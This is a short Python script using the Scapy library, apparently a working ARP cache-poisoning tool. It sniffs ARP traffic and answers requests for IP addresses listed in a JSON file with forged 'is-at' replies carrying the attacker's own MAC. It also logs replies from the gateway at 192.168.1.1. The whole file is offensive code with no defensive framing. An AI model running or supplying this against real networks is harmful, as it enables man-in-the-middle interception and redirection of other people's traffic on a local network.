#! /usr/bin/python

from scapy.all import *
import json

subip = {}

def arp_response(pkt):
	if pkt.op==2 and pkt.psrc=="192.168.1.1":
		print("ARP Response From Gateway.")
	elif pkt.op==1 and subip.has_key(pkt.pdst):
		localMAC = get_if_hwaddr(conf.iface)

		arp = (
			Ether(src=localMAC, dst=pkt.hwsrc)/
			ARP(
		    	op="is-at",
		    	#posion to wlan interface
		    	hwsrc=localMAC,
		    	psrc=pkt.pdst,
		    	#send back to the source host
		    	hwdst=pkt.hwsrc,
		    	pdst=pkt.psrc
		    )
		)
		sendp(arp, iface=conf.iface)
		print(arp.pdst + " spoofed when calling " + arp.psrc)
	pass


if __name__ == '__main__':
	with open('./subip_list.json') as json_file:
		subip = json.load(json_file)

	print("Running over " + conf.iface + " ...")
	sniff(filter="arp", prn=arp_response)
